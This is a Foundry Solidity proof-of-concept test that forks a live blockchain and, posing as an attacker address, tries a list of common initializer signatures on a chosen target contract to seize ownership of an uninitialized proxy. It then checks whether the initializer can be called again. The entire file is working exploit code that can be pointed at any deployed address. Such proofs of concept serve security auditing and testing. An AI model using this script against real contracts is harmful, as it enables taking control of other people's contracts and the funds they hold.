// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import "forge-std/console2.sol";

contract PoC_InitializerFirstCall is Test {
    address public target;
    address public attacker;

    function setUp() public {
        string memory rpc = vm.envString("RPC_URL");
        uint256 blockNum = vm.envUint("BLOCK_NUMBER");
        target = vm.envAddress("TARGET_ADDRESS");
        attacker = vm.envOr("ATTACKER", address(0xBEEF));
        vm.createSelectFork(rpc, blockNum);
    }

    function test_Initializer_FirstCall_Takeover() public {
        vm.startPrank(attacker, attacker);
        bool success = false;
        string memory which;

        (success,) = target.call(abi.encodeWithSignature("init()"));
        if (success) { which = "init()"; }
        if (!success) { (success,) = target.call(abi.encodeWithSignature("initialize()")); if (success) { which = "initialize()"; } }
        if (!success) { (success,) = target.call(abi.encodeWithSignature("initialize(address)", attacker)); if (success) { which = "initialize(address)"; } }
        if (!success) { (success,) = target.call(abi.encodeWithSignature("initialize(address,address)", attacker, attacker)); if (success) { which = "initialize(address,address)"; } }
        if (!success) { (success,) = target.call(abi.encodeWithSignature("initialize(address,uint256)", attacker, uint256(1))); if (success) { which = "initialize(address,uint256)"; } }
        if (!success) { (success,) = target.call(abi.encodeWithSignature("initialize(uint256)", uint256(1))); if (success) { which = "initialize(uint256)"; } }
        if (!success) { string memory fundName = vm.envOr("FUND_NAME", string("Fund")); (success,) = target.call(abi.encodeWithSignature("init(address,address,string)", attacker, attacker, fundName)); if (success) { which = "init(address,address,string)"; } }
        vm.stopPrank();

        console2.log("Attempted initializer takeover on:");
        console2.log("  Success:", success);
        if (success) {
            vm.startPrank(attacker, attacker);
            (bool ok2,) = target.call(abi.encodeWithSignature(which));
            vm.stopPrank();
            assertTrue(!ok2, "Initializer remained callable a second time; cannot confirm single-use guard");
        }
    }
}
